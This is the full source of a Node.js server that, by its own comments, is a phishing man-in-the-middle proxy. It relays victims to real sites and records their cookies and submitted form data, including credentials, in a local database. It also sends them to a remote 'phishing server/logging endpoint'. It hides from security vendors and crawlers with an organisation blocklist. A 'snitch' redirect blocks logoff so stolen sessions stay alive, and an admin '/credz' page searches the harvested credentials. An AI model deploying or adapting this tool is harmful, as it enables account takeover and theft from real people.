const fs = require('fs');
const got = require('got');
const fastify = require('fastify')({ logger: false })
const replace = require('buffer-replace')
const dateFormat = require('dateformat')
fastify.register(require('fastify-cookie'))

var ip_blacklist = []
var ip_whitelist = []
const org_blacklist = ["Google","Microsoft","Forcepoint","Mimecast","ZSCALER","Fortinet","Amazon","PALO ALTO","RIPE","McAfee","M247","Internap","AS205100","YISP","Kaspersky","Berhad","DigitalOcean","IP Volume","Markus","ColoCrossing","Norton","Datacamp Limited","Scalair SAS","NForce Entertainment","Wintek Corporation","ONLINE S.A.S.","WestHost","Labitat","Orange Polska Spolka Akcyjna","OVH SAS","DediPath","AVAST","GoDaddy","SunGard","Netcraft","Emsisoft","CHINANET","Rackspace","Selectel","Sia Nano IT","AS1257","Zenlayer","Hetzner","AS51852","TalkTalk Communications","Spectre Operations","VolumeDrive","Powerhouse Management","HIVELOCITY","SoftLayer Technologies","AS3356","AS855","AS7459","AS42831","AS61317","AS5089","Faction","Plusnet","Total Server","AS262997","AS852","Guanghuan Xinwang","AS174","AS45090","AS41887","Contabo","IPAX","AS58224","AS18002","HangZhou","Linode","AS6849","AS34665","SWIFT ONLINE BORDER","AS38511","AS131111","Telefonica del Peru","BRASIL S.A","Merit Network","Beijing","QuadraNet","Afrihost","Vimpelcom","Allstream","Verizon","HostRoyale","Hurricane Electric","AS12389","Packet Exchange","AS52967","AS45974","Fastweb","AS17552","Alibaba","AS12978","AS43754","CariNet","AS28006","Free Technologies","DataHata","GHOSTnet","AS55720","Emerald Onion","AS208323","AS6730","AS11042","AS53667","AS28753","AS28753","Globalhost d.o.o","AS133119","Huawei","FastNet","AS267124","BKTech","Optisprint","AS24151","Pogliotti","321net","AS4800","Kejizhongyi","SIMBANET","AS42926","Web2Objects","AS12083"]

//display welcome banner
console.log(fs.readFileSync('./resources/banner.txt','utf8'))

//config for our domains
config_file = fs.readFileSync("./config.json");
config = JSON.parse(config_file);

//admin config for the tool
admin_config_file = fs.readFileSync("./admin_config.json");
admin_config = JSON.parse(admin_config_file);

//define our mime types for custom payload delivery
mime_file = fs.readFileSync("./wwwroot/mimetypes.json");
mime_types = JSON.parse(mime_file);

//add a wildcard type handler for all unsupported types
fastify.addContentTypeParser('*', function (req, done) {
  var data = ''
  req.on('data', chunk => { data += chunk })
  req.on('end', () => {
    done(null, data)
  })
})

//define our own content parser for JSON
fastify.addContentTypeParser('application/json', { parseAs: 'string' }, function (req, body, done) {
  try {
    var json = body
    done(null, json)
  } catch (err) {
    err.statusCode = 400
    done(err, undefined)
  }
})

fastify.decorateReply('sendFile', filename => {
  const stream = fs.createReadStream(filename)
  this.type('text/html').send(stream)
})

//basic access log for the server
access_log = fs.createWriteStream("./logs/access.log", {flags:'a'})

//set up the database for local logging
const Database = require('better-sqlite3')
const { resolve } = require("path")
const db = new Database('./logs/humble.db')
//const db = new Database('./logs/humble.db', { verbose: console.log })

let posts_table_setup = db.prepare(`
    CREATE TABLE IF NOT EXISTS posts (
      timestamp TEXT,
      tracking_id TEXT,
      domain TEXT,
      url TEXT,
      post TEXT
    )
`)

posts_table_setup.run()

let cookies_table_setup = db.prepare(`
    CREATE TABLE IF NOT EXISTS cookies (
      timestamp TEXT,
      tracking_id TEXT,
      domain TEXT,
      url TEXT,
      cookie TEXT
    )
`)
 
cookies_table_setup.run()

var new_entry = function(table, tracking_id, data, callback){
  let select = ""
  if(table == "cookies"){
    select = "SELECT cookie FROM cookies WHERE tracking_id = ? AND cookie = ?"
  }else{
    select = "SELECT post FROM posts WHERE tracking_id = ? AND post = ?"
  }
  let entry_check = db.prepare(select)
  let matching_entry = entry_check.get(tracking_id, data)
  if (matching_entry != null) {
    //console.log("skipping duplicate:" + data)
  }else{
    callback()
  }
}

var log_local = function(table, tracking_id, domain, url, data){
  if(table == "cookies"){
    var stmt = db.prepare("INSERT INTO cookies VALUES (?,?,?,?,?)")
    stmt.run(dateFormat("isoDateTime"), tracking_id, domain, url, data)
  }else{
    var stmt = db.prepare("INSERT INTO posts VALUES (?,?,?,?,?)")
    stmt.run(dateFormat("isoDateTime"), tracking_id, domain, url, data)
  }
}

var ship_logs = function(log_data, domain_config){
  var headers = { 
    'Content-Type': 'application/json',
    'Cookie': domain_config.logging_endpoint.auth_cookie
  } 
  //send logs off to our phishing server/logging endpoint
  got.post("https://" + domain_config.logging_endpoint.host + domain_config.logging_endpoint.url , {
    headers: headers,
    https: {rejectUnauthorized: false},
    json: log_data
  }).catch(function(err){
    console.log("Logging Endpoint Failed: https://" + domain_config.logging_endpoint.host + domain_config.logging_endpoint.url)
    console.log("Error:" + err)
    //console.log("Error:" + err.response.body)
    return
  })
}

async function humble_proxy(request, reply){
  let myreq = request.req
  let clone_page = false
  let client_ip = myreq.headers['x-real-ip']
  let client_protocol = myreq.headers['x-real-protocol']
  //set up a fallback in case we get a request for a domain that does not have a config
  let domain_config = config["fallback_config"]
  //TODO make better assumptions on the default domain as a fallback
  let humble_domain = myreq.hostname
  //find out wich domain config to use
  Object.keys(config).forEach(function(key) {
    if(myreq.hostname.includes(key)){
      domain_config = config[key]
      humble_domain = key 
    } 
  })
  //directly deliver file if the url contains our wwwroot search string
  if(myreq.url.includes(domain_config.wwwroot)){
    try {
      let file_name = myreq.url.split('/').pop().split('?')[0]
      let extention = file_name.split('.')[1]
      let mime_type = mime_types[extention]
      let stream = fs.createReadStream('./wwwroot/' + file_name)
      if(typeof (request.cookies[domain_config.tracking_cookie]) != 'undefined'){
         click_id = request.cookies[domain_config.tracking_cookie]
      }else{
        reply.setCookie(domain_config.tracking_cookie, request.query[domain_config.search_string], {path: '/', httpOnly: true, secure: true, maxAge: 31536000, domain: humble_domain})
        click_id = request.query[domain_config.search_string]
      }
      reply.type(mime_type).send(stream)
      ship_logs({"event_ip": client_ip, "target": click_id, "event_type": "DIRECT_DOWNLOAD", "event_data": file_name}, domain_config)
      access_log.write(JSON.stringify({"event_ip": client_ip, "target": click_id, "event_type": "DIRECT_DOWNLOAD", "event_data": file_name}) + "\n")
    } catch(err) {
      console.log("Coundn't Find  File in wwwroot: " + file_name)
      reply.send("")
    }
  //add a "snitch" feature to redirect logoff attempts and keep our sessions alive based on the config
  }else if(myreq.url.includes(domain_config.snitch.snitch_string)){
    reply.redirect(domain_config.snitch.redirect_url)
  //otherwise run a MitM attack against our target domains based on the config
  }else{
    //set up the default MitM target to the hide behind domain
    let target_domain = domain_config.primary_target
    let tracking_id = ''
    //target the real domain if we have already seen this user
    if(typeof (request.cookies[domain_config.tracking_cookie]) != 'undefined'){
      target_domain = domain_config.secondary_target
      tracking_id = request.cookies[domain_config.tracking_cookie]
      if(tracking_id == 'clone') {
        clone_page = true
      }
    }
    //check if we have a click with the correct GET param to track the user
    if(typeof (request.query[domain_config.search_string]) != 'undefined'){
      target_domain = domain_config.secondary_target
      if(request.query[domain_config.search_string] == 'clone') {
        clone_page = true
      }
      reply.setCookie(domain_config.tracking_cookie, request.query[domain_config.search_string], {path: '/', httpOnly: true, secure: true, maxAge: 31536000, domain: humble_domain})
      tracking_id = request.query[domain_config.search_string]
      ship_logs({"event_ip": client_ip, "target": tracking_id, "event_type": "CLICK", "event_data": myreq.url}, domain_config)	
      access_log.write(JSON.stringify({"event_ip": client_ip, "target": tracking_id, "event_type": "CLICK", "event_data": myreq.url}) + "\n")
    }
    sub_humble_to_target = RegExp(humble_domain, 'ig')
    myreq.hostname = myreq.hostname.replace(sub_humble_to_target, target_domain)
    //swap all references of our domain with the target domain in the headers
    myreq.headers = JSON.parse(JSON.stringify(myreq.headers).replace(sub_humble_to_target, target_domain))
    //and custom substitutions
    Object.keys(domain_config.replacements).forEach(function(key) {
      let global_sub = RegExp(domain_config.replacements[key], 'ig')
      myreq.headers = JSON.parse(JSON.stringify(myreq.headers).replace(global_sub, key))
    }) 
    if((typeof myreq.headers.cookie) != 'undefined'){
      //don't leak our admin cookie or tracking cookies to any target domains
      admin_cookie_regex = RegExp(admin_config.admin_cookie.cookie_name + '.?=.?' + admin_config.admin_cookie.cookie_value + '.?;? ?', 'gi')
      tracking_cookie_regex = new RegExp(domain_config.tracking_cookie + '=([^;]*)(;|$)', 'i')
      myreq.headers.cookie = myreq.headers.cookie.replace(admin_cookie_regex, '').replace(tracking_cookie_regex, '').trim()
      //ship logs if we get some cookies so we can steal sessions
      if(tracking_id != '' & Object.keys(request.cookies).length > 1){
        delete request.cookies[domain_config.tracking_cookie]
        //only log previously unrecorded cookies
        new_entry('cookies', tracking_id, JSON.stringify(request.cookies), function(){
          log_local('cookies', tracking_id, target_domain, myreq.url, JSON.stringify(request.cookies))
          ship_logs({"event_ip": client_ip, "target": tracking_id, "event_type": "COOKIE_DATA", "event_data": JSON.stringify(request.cookies)}, domain_config)	
          access_log.write(JSON.stringify({"event_ip": client_ip, "target": tracking_id, "event_type": "COOKIE_DATA", "event_data": JSON.stringify(request.cookies)})+"\n")
	})
      }
    } 
    //x-real-ip is for internal tracking use only. Don't let the server see it
    delete myreq.headers['x-real-ip']
    delete myreq.headers['x-real-protocol']
    request_options = {
      followRedirect: false,
      throwHttpErrors: false,
      https: {rejectUnauthorized: false},
      headers: myreq.headers,
      method: myreq.method
    }
    if(request.body != null){
      //swap refrences in the body as well
      request_options.body = request.body.replace(sub_humble_to_target, target_domain)
      //and custom subs
      Object.keys(domain_config.replacements).forEach(function(key) {
        let global_sub = RegExp(domain_config.replacements[key], 'ig')
        request_options.body = request_options.body.replace(global_sub, key)
      })
      console.log(request_options.body)
      myreq.headers["Content-Length"] = request_options.body.length
      if(tracking_id != ''){
        new_entry('posts', tracking_id, request.body, function(){
          log_local('posts', tracking_id, target_domain, myreq.url, request.body)
          ship_logs({"event_ip": client_ip, "target": tracking_id, "event_type": "POST_DATA", "event_data": request.body}, domain_config)
          access_log.write(JSON.stringify({"event_ip": client_ip, "target": tracking_id, "event_type": "POST_DATA", "event_data": request.body})+"\n")
	})
      }
    }
    console.log(client_ip + ":" +  myreq.method + ":" + client_protocol + "://" + myreq.hostname + myreq.url)
    access_log.write(client_ip + ":" +  myreq.method + ":" + client_protocol + "://" + myreq.hostname + myreq.url + "\n")
    //swap all references of our domain with the target domain in the URL
    myreq.url = myreq.url.replace(sub_humble_to_target, target_domain)
    //and custom subs as well
    Object.keys(domain_config.replacements).forEach(function(key) {
      let global_sub = RegExp(domain_config.replacements[key], 'ig')
      myreq.url = myreq.url.replace(global_sub, key)
    })
    response = await got(client_protocol + "://" + myreq.hostname + myreq.url, request_options).catch(function(err){
      console.log("problem with:" + client_protocol + "://" + myreq.hostname + myreq.url)
      reply.send()
      return
    })
    sub_target_to_humble = RegExp(target_domain, 'ig')
    if(response == undefined){
      reply.send()
      return
    }
    response.rawBody = replace(response.rawBody, target_domain, humble_domain)
    if (clone_page) {
      let url_components = myreq.url.split('/')
      let file_name = url_components.pop().split('?')[0]
      if (url_components.length == 1 ) {
        file_name = 'index.html'
      }  
      let file_path = './wwwroot/' + myreq.hostname + url_components.join('/')
      fs.mkdirSync(file_path, { recursive: true })
      fs.writeFileSync(file_path + '/' + file_name, response.rawBody)
    }
    //handle any custom additional replacements in the body
    Object.keys(domain_config.replacements).forEach(function(key) {
      response.rawBody = replace(response.rawBody, key, domain_config.replacements[key])
    }) 
    //swap domain references in the headers
    reply.headers(JSON.parse(JSON.stringify(response.headers).replace(sub_target_to_humble, humble_domain)))
    //and the custom subs as well
    //Object.keys(domain_config.replacements).forEach(function(key) {
      //let global_sub = RegExp(key, 'ig')
      //reply.headers(JSON.parse(JSON.stringify(response.headers).replace(global_sub, domain_config.replacements[key])))
    //})
    reply.headers({"content-encoding": "none"})
    reply.headers({"Content-Length": response.rawBody.length})
    //console.log(reply.headers())
    reply.code(response.statusCode)
    reply.send(response.rawBody)
  }
}

//add easy 404 function
fastify.decorate('notFound', (request, reply) => {
  reply.code(404).type('text/html').send('Not Found')
})

//catchall route for the attack
fastify.route({
  method: ['DELETE', 'GET', 'HEAD', 'PATCH', 'POST', 'PUT', 'OPTIONS'],
  url: '/*',
  handler: async function (request, reply) {
    let client_ip = request.headers['x-real-ip']
    if(ip_blacklist.includes(client_ip)){
      return fastify.notFound(request, reply)
    }else if(ip_whitelist.includes(client_ip)){
      humble_proxy(request, reply)
    }else{
     let ip_info = await got(`http://ipinfo.io/${client_ip}/json`)
      let ip_org = JSON.parse(ip_info.body).org
      let ip_country = JSON.parse(ip_info.body).country
      let approved = true
      if(ip_country != "US"){
        approved = false
      }
      org_blacklist.forEach(function(crawler_org){
        if(ip_org.match(crawler_org)){
          approved = false
        }
      })
      if(approved){
        console.log(`Allowing organization: "${ip_org}" from ${client_ip}`)
        ip_whitelist.push(client_ip)
        humble_proxy(request, reply)
      }else{
        console.log(`blocking blacklisted org: "${ip_org}" from ${client_ip}`)
        ip_blacklist.push(client_ip)
        return fastify.notFound(request, reply)
      }
    }
  }
})

//route to view and modify the current config
fastify.route({
  method: ['GET'],
  url: '/config',
  handler: async function (request, reply) {
    if(request.cookies[admin_config.admin_cookie.cookie_name] == admin_config.admin_cookie.cookie_value){
      let stream = fs.createReadStream('./resources/config_page.html')
      reply.type('text/html').send(stream)
    }else{
      humble_proxy(request, reply)
    }
  }
})

//route to get the current config
fastify.route({
  method: ['PUT'],
  url: '/config',
  handler: async function (request, reply) {
    if(request.cookies[admin_config.admin_cookie.cookie_name] == admin_config.admin_cookie.cookie_value){
      reply.type('application/json').send(JSON.stringify(config))
    }else{
      humble_proxy(request, reply)
    }
  }
})

//route to save config changes
fastify.route({
  method: ['POST'],
  url: '/config',
  handler: async function (request, reply) {
    if(request.cookies[admin_config.admin_cookie.cookie_name] == admin_config.admin_cookie.cookie_value){
      try {
        config = JSON.parse(decodeURIComponent(request.body))
        fs.writeFileSync('./config.json', JSON.stringify(config, null, 4));
        console.log("Updated Config File: " + decodeURIComponent(request.body))
        reply.send("Successfully Saved Config")
      } catch(err) {
        reply.send("problem with config: " + err)
      }
    }else{
      humble_proxy(request, reply)
    }
  }
})

//route to view and search creds 
fastify.route({
  method: ['GET'],
  url: '/credz',
  handler: async function (request, reply) {
    if(request.cookies[admin_config.admin_cookie.cookie_name] == admin_config.admin_cookie.cookie_value){
      let stream = fs.createReadStream('./resources/credz_page.html')
      reply.type('text/html').send(stream)
    }else{
      humble_proxy(request, reply)
    }
  }
})

//route to run cred search queries as an API
fastify.route({
  method: ['POST'],
  url: '/credz',
  handler: async function (request, reply) {
    if(request.cookies[admin_config.admin_cookie.cookie_name] == admin_config.admin_cookie.cookie_value){
      var search = JSON.parse(request.body)
      let sql = db.prepare(`
        SELECT * FROM cookies WHERE 
          timestamp LIKE $timestamp
          AND domain LIKE $domain
          AND cookie LIKE $data`)
      let cookies = sql.all({
        timestamp: `%${search.timestamp}%`,
        domain: `%${search.domain}%`,
        data: `%${search.data}%`
      })
      sql = db.prepare(`
        SELECT * FROM posts WHERE
          timestamp LIKE $timestamp
          AND domain LIKE $domain
          AND url LIKE $url
          AND post LIKE $data
      `)
      let posts = sql.all({
        timestamp: `%${search.timestamp}%`,
        domain: `%${search.domain}%`,
        url: `%${search.url}%`,
        data: `%${search.data}%`
      })
      reply.type('application/json').send(JSON.stringify({"cookies": cookies, "posts": posts}))
    }else{
      humble_proxy(request, reply)
    }
  }
})

//route to deliver resource files for special pages
fastify.route({
  method: ['GET'],
  url: '/humbleflair/*',
  handler: async function (request, reply) {
    if(request.cookies[admin_config.admin_cookie.cookie_name] == admin_config.admin_cookie.cookie_value){
      let resource_file = request.raw.url.split('humbleflair')[1]
      let stream = fs.createReadStream('./resources/lib' + resource_file)
      reply.send(stream)
    }else{
      humble_proxy(request, reply)
    }
  }
})

//route to set our admin cookie based on the admin config
fastify.route({
  method: ['GET'],
  url: '/' + admin_config.set_admin.search_string,
  handler: async function (request, reply) {
    if(admin_config.set_admin.switch){
      myreq = request.req
      try {
        let humble_domain = myreq.hostname
        //find out wich domain config to use
        Object.keys(config).forEach(function(key) {
          if(myreq.hostname.includes(key)){
            humble_domain = key 
          } 
        })
        //turn the switch back off and save to disk in case of a restart
        admin_config.set_admin.switch = false
        fs.writeFileSync('./admin_config.json', JSON.stringify(admin_config, null, 4))
	reply.setCookie(admin_config.admin_cookie.cookie_name, admin_config.admin_cookie.cookie_value, {path: '/', httpOnly: true, secure: true, maxAge: 31536000, domain: humble_domain})
        reply.redirect("https://" + myreq.hostname + "/config" )
      } catch(err) {
        reply.send("problem setting cookie: " + err)
      }
    }else{
      humble_proxy(request, reply)
    }
  }
})

// Run the server!
const start = async () => {
  fastify.listen(8000, (err) => {
    if (err) {
      fastify.log.error(err)
      process.exit(1)
    }
    fastify.log.info(`server listening on ${fastify.server.address().port}`)
  })
}
start()
